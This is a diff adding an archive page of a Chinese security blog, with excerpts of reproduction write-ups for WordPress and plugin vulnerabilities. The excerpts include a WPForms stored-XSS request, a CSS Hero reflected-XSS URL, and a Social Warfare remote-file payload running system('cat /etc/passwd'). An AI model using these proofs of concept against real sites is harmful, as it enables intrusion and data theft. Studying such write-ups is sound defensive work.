@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/23/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/Wordpress _= 4.8.2 POST META 校验绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.682Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Wordpress-lt-4-8-2-POST-META-校验绕过漏洞"><a href="#Wordpress-lt-4-8-2-POST-META-校验绕过漏洞" class="headerlink" title="Wordpress &lt;= 4.8.2 POST META 校验绕过漏洞"></a>Wordpress &lt;= 4.8.2 POST META 校验绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="一个MySQL的trick"><a href="#一个MySQL的trick" class="headerlink" title="一个MySQL的trick"></a>一个MySQL的trick</h3><p>1). 正常的条件查询语句</p>
+<pre><code>mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &#39;_thumbnail_id&#39;;
++---------+---------+----------------+------------+
+| meta_id | post_id | meta_key       | meta_value |
++---------+---------+----------------+------------+
+|       4 |       4 | _thumbnail_id  | TESTC      |
++---------+---------+----------------+------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p>2). 现在我们将_thumbnail_id修改成”\x00_thumbnail_id”</p>
+<pre><code>mysql&gt; update wp_postmeta set meta_key = concat(0x00,&#39;TESTC&#39;) where meta_value = &#39;_thumbnail_id&#39;;
+Query OK, 0 rows affected (0.00 sec)
+Rows matched: 0  Changed: 0  Warnings: 0
+</code></pre>
+<p>3). 再次执行第一步的查询</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygn00m3y8v1eaubgwi2" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/Wordpress _= 4.7.4 XML-RPC API POST META 未校验漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.7.4%20XML-RPC%20API%20POST%20META%20%E6%9C%AA%E6%A0%A1%E9%AA%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.679Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Wordpress-lt-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><a href="#Wordpress-lt-4-7-4-XML-RPC-API-POST-META-未校验漏洞" class="headerlink" title="Wordpress &lt;= 4.7.4 XML-RPC API POST META 未校验漏洞"></a>Wordpress &lt;= 4.7.4 XML-RPC API POST META 未校验漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="中文版"><a href="#中文版" class="headerlink" title="中文版"></a>中文版</h3><p>以作者身份登录到您的wordpress</p>
+<p>上传图片</p>
+<p>记住图像/媒体的ID</p>
+<p>创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元）</p>
+<p>记住帖子ID</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.7.4%20XML-RPC%20API%20POST%20META%20%E6%9C%AA%E6%A0%A1%E9%AA%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.7.4%20XML-RPC%20API%20POST%20META%20%E6%9C%AA%E6%A0%A1%E9%AA%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygl00m1y8v19nlr3151" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/Wordpress 5.2.4 cors跨域劫持漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.676Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Wordpress-5-2-4-cors跨域劫持漏洞"><a href="#Wordpress-5-2-4-cors跨域劫持漏洞" class="headerlink" title="Wordpress 5.2.4 cors跨域劫持漏洞"></a>Wordpress 5.2.4 cors跨域劫持漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource<br>sharing）。通过该标准，可以允许浏览器向跨源服务器发出 XMLHttpRequest<br>请求，从而克服了AJAX只能同源使用的限制，进而读取跨域的资源。CORS允许Web服务器通知Web浏览器应该允许哪些其他来源从该Web服务器的回复中访问内容</p>
+<p>漏洞产生原因：在Access-Control-Allow-Origin中反射请求的Origin值。该配置可导致任意攻击者网站可以直接跨域读取其资源内容。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Wordpress 5.2.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>1、影响版本wordpress5.2.4，首先访问首页，利用burp抓包</p>
+<p><img src="/resource/Wordpress5.2.4cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>2、然后发送到reapeter，日常go一下，看到返回包内容，返回了/wp-json</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygk00m0y8v1evunchot" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 插件漏洞/（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-12462%EF%BC%89WordPress%20Plugin%20-%20Ninja%20Forms%20CSRF%20to%20XSS/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.146Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-12462）WordPress-Plugin-Ninja-Forms-CSRF-to-XSS"><a href="#（CVE-2020-12462）WordPress-Plugin-Ninja-Forms-CSRF-to-XSS" class="headerlink" title="（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS"></a>（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Ninja Forms 3.4.24.2之前的所有版本中存在一个严重的CSRF to<br>XSS漏洞。成功利用此漏洞可以使得攻击者将WordPress网站中启用的Ninja<br>Forms表单替换为包含恶意JavaScript的表单。当用户使用这些表单时触发xss漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Ninja Forms &lt; 3.4.24.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>根据漏洞披露来看，本次漏洞存在于ninja-forms\lib\NF_Upgrade.php文件<br>ninja_forms_ajax_import_form函数</p>
+<p>在分析漏洞之前，我们先来了解下这个存在漏洞的文件是做什么用的。存在漏洞的文件名为NF_Upgrade.php，从字面意义上来看，是升级的意思，但这个文件的功能并不是如同其命名（Upgrade）那样用来升级ninja-forms插件版本，而是涉及到ninja-forms的一个特殊功能——“降级”Ninja Forms插件中存在着一个名为<br>“降级”的功能。使用该功能用户可以将其表单样式和功能恢复为该插件2.9.x版本</p>
+<p><img src="/resource/(CVE-2020-12462)WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId24.png" alt="1.png"></p>
+<p>使用降级后，将删除目前安装的3.0版本的所有表单数据。因此该功能提示用户在使用该功能前导出表单数据。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-12462%EF%BC%89WordPress%20Plugin%20-%20Ninja%20Forms%20CSRF%20to%20XSS/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-12462%EF%BC%89WordPress%20Plugin%20-%20Ninja%20Forms%20CSRF%20to%20XSS/" data-id="cl5c2qybx00lzy8v131drdd1v" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 插件漏洞/（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-10385%EF%BC%89WordPress%20Plugin%20-%20WPForms%201.5.9%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.144Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-10385）WordPress-Plugin-WPForms-1-5-9-储存型xss"><a href="#（CVE-2020-10385）WordPress-Plugin-WPForms-1-5-9-储存型xss" class="headerlink" title="（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss"></a>（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WordPress WPForms Contact Form<br>1.5.9之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Version: 1.5.8.2 and below</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: www.0-sec.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.0-sec.org/wp-admin/admin.php?page=wpforms-builder&amp;view=settings&amp;form_id=23
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 3140
+Origin: http://www.0-sec.org
+Connection: close
+Cookie: wp-saving-post=15-saved; wordpress_db156a460ca831632324809820a538ce=jinson%7C1582145873%7CBKGMGaw77TcSEz7kE0ijBd8VfAq7KwALhBVfKNRbKst%7Cf826697f923b7f17c30049eea275c6523b7e2418ab354e106c50f0314b9bdae9; comment_author_email_db156a460ca831632324809820a538ce=dev-email@flywheel.local; comment_author_db156a460ca831632324809820a538ce=jinson; wp-settings-time-1=1581973079; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_db156a460ca831632324809820a538ce=jinson%7C1582145873%7CBKGMGaw77TcSEz7kE0ijBd8VfAq7KwALhBVfKNRbKst%7Cbaecd49d797bff21499da712891744737c67fd481d59e04a952554579f26c637
+ 
+action=wpforms_save_form&amp;data=%5B%7B%22name%22%3A%22id%22%2C%22value%22%3A%2223%22%7D%2C%7B%22name%22%3A%22field_id%22%2C%22value%22%3A%2213%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bid%5D%22%2C%22value%22%3A%2211%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Btype%5D%22%2C%22value%22%3A%22text%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blabel%5D%22%2C%22value%22%3A%22Single+Line+Text%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bdescription%5D%22%2C%22value%22%3A%22%3Cscript%3Ealert(%5C%22XSS+on+form+description%5C%22)%3C%2Fscript%3E%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bsize%5D%22%2C%22value%22%3A%22medium%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bplaceholder%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blimit_count%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blimit_mode%5D%22%2C%22value%22%3A%22characters%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bdefault_value%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bcss%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Binput_mask%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bform_title%5D%22%2C%22value%22%3A%22Security+Test+WPForms%22%7D%2C%7B%22name%22%3A%22settings%5Bform_desc%5D%22%2C%22value%22%3A%22%3Cscript%3Ealert(%5C%22XSS+on+form+description+2%5C%22)%3C%2Fscript%3E%22%7D%2C%7B%22name%22%3A%22settings%5Bform_class%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_text%5D%22%2C%22value%22%3A%22Submit%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_text_processing%5D%22%2C%22value%22%3A%22Sending...%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_class%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bhoneypot%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bnotification_enable%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bemail%5D%22%2C%22value%22%3A%22%7Badmin_email%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsubject%5D%22%2C%22value%22%3A%22New+Security+Test+WPForms+Entry%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsender_name%5D%22%2C%22value%22%3A%22ptest%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsender_address%5D%22%2C%22value%22%3A%22%7Badmin_email%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Breplyto%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bmessage%5D%22%2C%22value%22%3A%22%7Ball_fields%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Btype%5D%22%2C%22value%22%3A%22message%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bmessage%5D%22%2C%22value%22%3A%22%3Cp%3EThanks+for+contacting+us!+We+will+be+in+touch+with+you+shortly.%3C%2Fp%3E%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bmessage_scroll%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bpage%5D%22%2C%22value%22%3A%222%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bredirect%5D%22%2C%22value%22%3A%22%22%7D%5D&amp;id=23&amp;nonce=938cf431d2
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-10385%EF%BC%89WordPress%20Plugin%20-%20WPForms%201.5.9%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-10385%EF%BC%89WordPress%20Plugin%20-%20WPForms%201.5.9%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qybx00lyy8v1dbg928ba" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 插件漏洞/（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞 " class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-9978%EF%BC%89WordPress%20Plugin%20-%20social%20warfare%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.142Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-9978）WordPress-Plugin-social-warfare-远程命令执行漏洞"><a href="#（CVE-2019-9978）WordPress-Plugin-social-warfare-远程命令执行漏洞" class="headerlink" title="（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞"></a>（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WordPress<br>social-warfare插件3.5.3之前版本中存在跨站脚本漏洞。远程攻击者可借助’swp_url’参数利用该漏洞注入恶意的JavaScript脚本。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Social WarFare Plugin (&lt;=3.5.2)</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>首先在自己的服务器上传http(s)://<a target="_blank" rel="noopener" href="http://www.0-sec.org/payload.txt">www.0-sec.org/payload.txt</a></p>
+</blockquote>
+<pre><code>&lt;pre&gt;system(&#39;cat /etc/passwd&#39;)&lt;/pre&gt;
+</code></pre>
+<blockquote>
+<p>useage</p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-9978%EF%BC%89WordPress%20Plugin%20-%20social%20warfare%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-9978%EF%BC%89WordPress%20Plugin%20-%20social%20warfare%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20/" data-id="cl5c2qybw00lwy8v16gdl96gm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 插件漏洞/（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-19133%EF%BC%89WordPress%20Plugin%20-%20CSS%20Hero%204.0.3%20%E5%8F%8D%E5%B0%84xss/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.140Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-19133）WordPress-Plugin-CSS-Hero-4-0-3-反射xss"><a href="#（CVE-2019-19133）WordPress-Plugin-CSS-Hero-4-0-3-反射xss" class="headerlink" title="（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss"></a>（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>CSS Hero插件 (&lt;= v.4.0.3)</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先WordPress应用中确保CSS Hero Plugin安装。</p>
+<p>poc</p>
+<pre><code>hxxp://
+0-sec.org/?csshero_action=edit_page&amp;rand=1015&amp;foo%22%3E%3C/iframe%3E%3Cscript%3Ealert(%27Reflected%20XSS%20in%20CSS%20Hero%204.0.3%27)%3C/script%3E%3Ciframe%3Ebar
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-19133%EF%BC%89WordPress%20Plugin%20-%20CSS%20Hero%204.0.3%20%E5%8F%8D%E5%B0%84xss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-19133%EF%BC%89WordPress%20Plugin%20-%20CSS%20Hero%204.0.3%20%E5%8F%8D%E5%B0%84xss/" data-id="cl5c2qybv00luy8v12lio7fzt" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 插件漏洞/（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16523%EF%BC%89WordPress%20Plugin%20-%20Events%20Manager%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.138Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
